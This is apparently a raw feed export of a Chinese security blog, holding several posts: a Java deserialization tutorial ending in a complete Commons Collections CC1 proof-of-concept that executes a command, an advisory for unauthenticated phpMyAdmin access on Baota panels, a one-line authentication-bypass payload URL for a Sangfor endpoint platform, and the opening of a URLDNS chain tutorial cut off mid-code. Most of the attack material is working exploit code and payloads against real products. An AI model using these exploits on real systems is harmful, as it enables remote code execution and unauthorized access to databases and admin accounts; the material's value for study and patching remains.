class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-简单的DEMO"><a href="#0x04-简单的DEMO" class="headerlink" title="0x04 简单的DEMO"></a>0x04 简单的DEMO</h1><p>下面是P牛写的dome</p><p>简单的利上面的知识点，构造了一个简单的链，达到命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">"zeo"</span>, <span class="string">"666"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析一下："><a href="#分析一下：" class="headerlink" title="分析一下："></a>分析一下：</h3><ol><li>实例化new Transformer的数组，构造中间的小链子</li><li>小链子主要有两个ConstantTransformer，InvokerTransformer 这个两个构造好后，放入刚刚提到的ChainedTransformer类里面，他们就是连起来的里面，大概就是下面这么个情况<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNjU4NTYucG5n?x-oss-process=image/format,png" alt="image-20200825165856011"></li><li>命令执行造好了，还有一个触发ChainedTransformer的方法，就是TransformedMap.decorate方法</li><li>实例化一个map对象，然后修饰绑定上transformerChain这个上面，每当有map有新元素进来的时候，就会触发上面的链</li><li>所以map对象put(“test”, “xxxx”)一下就会触发命令执行成功弹出了计算器</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNzA1MzgucG5n?x-oss-process=image/format,png" alt="image-20200825170538165"></p><h1 id="0x05-改写POC"><a href="#0x05-改写POC" class="headerlink" title="0x05 改写POC"></a>0x05 改写POC</h1><ul><li><p>上面的漏洞虽然触发了，但是其实是手动触发，没什么用的。</p></li><li><p>反序列化洞，你不得找到一个反序列化的点，来触发这个洞吗？</p></li><li><p>所以，目标是：找到⼀个类，它在反序列化的readObject逻辑⾥有类似的写⼊操作。</p></li><li><p>这个类就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure><ul><li>反序列化的实现方法</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>发现主要的触发点在 memberValue.setValue()，这个方法可以往map对象里面赋值。</li><li>memberValue成员变量是map对象</li><li>所以最终的流程：</li></ul><p>把之前构造的transform链包装成一个Map对象</p><p>将它作为AnnotationInvocationHandler反序列后的memberValue</p><p>在readObject反序列化的时候，触发memberValue.setValue()</p><p>然后再触发TransformedMap里的transform()</p><p>最后实现命令执行。</p><h2 id="Transformer的利用也要改写"><a href="#Transformer的利用也要改写" class="headerlink" title="Transformer的利用也要改写"></a>Transformer的利用也要改写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//利用InvokerTransformer的反射功能，构造可以序列化的 java.lang.Class 的 Runtime，class对象</span></span><br><span class="line">                <span class="comment">//利用反射构造命令执行</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new String[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>改写就是将 Runtime.getRuntime() 换成了 Runtime.class</p><p>原因是：java.lang.Runtime 对象不能反序列化</p><table><thead><tr><th>方法</th><th>类</th><th>可否序列化</th></tr></thead><tbody><tr><td>Runtime.getRuntime()</td><td>java.lang.Runtime</td><td>no</td></tr><tr><td>Runtime.class</td><td>java.lang.Class</td><td>yes</td></tr></tbody></table><p>重点：Java中不是所有对象都⽀持序列化，Java类 必须都实现了 java.io.Serializable 接⼝，才可以序列化，所以我们得换一个对象实现POC的改写</p><h1 id="0x06最终POC"><a href="#0x06最终POC" class="headerlink" title="0x06最终POC"></a>0x06最终POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造Transformer的小链式</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//利用InvokerTransformer的反射功能，构造可以序列化的 java.lang.Class 的 Runtime，class对象</span></span><br><span class="line">                <span class="comment">//利用反射构造命令执行</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new String[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将transformers链式的串起来在transformerChain内部</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"zeo"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绑定map到修饰器</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler，将内部的方法实例化他</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作，讲上述构造的handler恶意的对象，序列化保存</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//没实际作用，就是打印看一下反序列化的数据</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发反序列化操作，触发漏洞</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjcxNDMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200827143035470"></p><h1 id="0x07总结"><a href="#0x07总结" class="headerlink" title="0x07总结"></a>0x07总结</h1><p>​ 还是挺有意义的吧，了解底层的原来，还有一些类的原理没有摸透，得好好再看看。</p><p>​ 反射的基础还是挺重要的，得多学习。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宝塔 未授权访问漏洞</title>
      <link href="/2020/08/24/%E5%AE%9D%E5%A1%94%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/24/%E5%AE%9D%E5%A1%94%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>宝塔8.23日发布紧急更新提示。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjMyMDA5NTMucG5n?x-oss-process=image/format,png" alt="image-20200823200953264"></p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a><strong>0x02 影响范围</strong></h1><p>宝塔linux面板 &lt; 7.4.2</p><p>宝塔windows面板 &lt; 6.8</p><p>并且安装了phpmyadmin</p><h1 id="0x03-漏洞详情"><a href="#0x03-漏洞详情" class="headerlink" title="0x03:漏洞详情"></a><strong>0x03:漏洞详情</strong></h1><p>phpmyadmin没有加权限，直接未授权访问，直接查询数据库，从而拿到整站数据</p><p>利用：</p><p>ip:888/pma</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjQwMTEwMjYucG5n?x-oss-process=image/format,png" alt="image-20200824011026545"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>升级到宝塔最新版</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>某信服-SANGFOR终端检测响应平台 - 任意用户登录 0day</title>
      <link href="/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%20-%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%200day/"/>
      <url>/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%20-%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%200day/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>平台版本号：&lt; 3.2.19</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>payload: <a href="https://ip/ui/login.php\?user=admin" target="_blank" rel="noopener">https://ip/ui/login.php\?user=admin</a></p><p>例如: <a href="https://127.0.0.1:5000/ui/login.php\?user=admin" target="_blank" rel="noopener">https://127.0.0.1:5000/ui/login.php\?user=admin</a></p><p>成功利用</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjAwOTM2MTkucG5n?x-oss-process=image/format,png" alt="image-20200820093619309"></p><p>参考文章：</p><p><a href="https://www.yuque.com/pmiaowu/hcy2bz/fp4icw\?from=groupmessage" target="_blank" rel="noopener">https://www.yuque.com/pmiaowu/hcy2bz/fp4icw\?from=groupmessage</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：Java反序列化入门之URLDNS链</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自学Java 代码审计，主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>之前研究了，但是没有整理好，因为有hvv任务，所以推迟了一些，现在赶紧整理发出来。</p><h1 id="0x01-Java反序列化介绍"><a href="#0x01-Java反序列化介绍" class="headerlink" title="0x01 Java反序列化介绍"></a>0x01 Java反序列化介绍</h1><p><strong>Java反序列化漏洞的产生原因：</strong></p><p>简单的说就是，在于开发者在重写 <strong>readObject</strong> 方法的时候，写入了漏洞代码。</p><p><strong>序列化和反序列化本身并不存在问题</strong></p><p>但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h1 id="0x02-反序列化方法的对比"><a href="#0x02-反序列化方法的对比" class="headerlink" title="0x02 反序列化方法的对比"></a>0x02 反序列化方法的对比</h1><p>在接触Java反序列化之前，就是PHP了，PHP的反序列化和着还是有区别的</p><ul><li><p>他们最基本的原理是类似的，反复横跳，找到一个利用链。</p></li><li><p>都是用于数据存储的一个格式化的操作。</p></li><li><p>将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，还原成对象。</p></li><li><p>而Java其提供了更加高级的writeObject ，允许在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读</p></li></ul><h2 id="0x021-PHP反序列化"><a href="#0x021-PHP反序列化" class="headerlink" title="0x021 PHP反序列化"></a>0x021 PHP反序列化</h2><ul><li>我们熟悉的都是那些魔术方法，去触发魔术方法，构造pop链。</li><li>wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</li><li>PHP的序列化、反序列化是低层过程，PHP的序列化是开发者是不能操作的。</li><li>开发者调用 serialize 函数后，序列化的数据就已经完成。</li><li>魔术方法只是在序列化前后对这个对象的操作。</li></ul><h2 id="0x022-JAVA反序列化"><a href="#0x022-JAVA反序列化" class="headerlink" title="0x022 JAVA反序列化"></a>0x022 JAVA反序列化</h2><ul><li>Java在序列化时一个对象，就不一样了，Java是在序列化的中间，去触发一下利用链，而不是php在序列化完成后</li><li>Java在序列化时，将会调用这个对象中的 writeObject 方法</li><li>反序列化时，会调用readObject</li><li>writeObject和readObject 方法开发者多种情况都是自己会重写，造成一些问题，构造触发链。</li></ul><h1 id="0x03-ysoserial-介绍"><a href="#0x03-ysoserial-介绍" class="headerlink" title="0x03 ysoserial 介绍"></a>0x03 ysoserial 介绍</h1><ul><li><p>15年的Apache Commons Collections 反序列化远程命令执行漏洞 (ysoserial 的最早的 commit ）</p></li><li><p>同时无数 Java 应用系统各种rce疯狂爆出</p></li><li><p>反序列化漏洞利⽤⼀个⾥程碑式的⼯具，ysoserial。</p></li><li><p>最开始我都以为，这是一个特定的利用工具，后来发现，为啥好多漏洞都用这个，才知道这是一个通用的工具。</p></li><li><p>ysoserial集合了各种java反序列化payload，它可以⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏命令。</p></li></ul><h1 id="0x04-URLDNS-原理"><a href="#0x04-URLDNS-原理" class="headerlink" title="0x04 URLDNS 原理"></a>0x04 URLDNS 原理</h1><p>这个是ysoserial中最简单的一条利用链了，也常常作为检测反序列化的功能，URLDNS这个pop链的大概的工作原理：</p><p>1、 java.util.HashMap重写了readObject方法：</p><p>​ 在反序列化时会调用 hash 函数计算 key 的 hashCode</p><p>2、java.net.URL对象的 hashCode 在计算时会调用 getHostAddress 方法</p><p>3、getHostAddress方法从而解析域名发出 DNS 请求</p><h1 id="0x05-构建漏洞代码"><a href="#0x05-构建漏洞代码" class="headerlink" title="0x05 构建漏洞代码"></a>0x05 构建漏洞代码</h1><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>ysoserial生成的代码，原理是一样的，下面是参考原理改写的一段，自己调试学习</p><p>反序列化的第一步，你得接受对象，然后反序列化吧</p><p>那么我们采用本地写一个序列号数据测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//漏洞出发点 hashmap，实例化出来</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//URL对象传入自己测试的dnslog</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://40zkzk.dnslog.cn"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//反射获取 URL的hashcode方法</span></span><br><span class="line">        Field f = Class.forName(<span 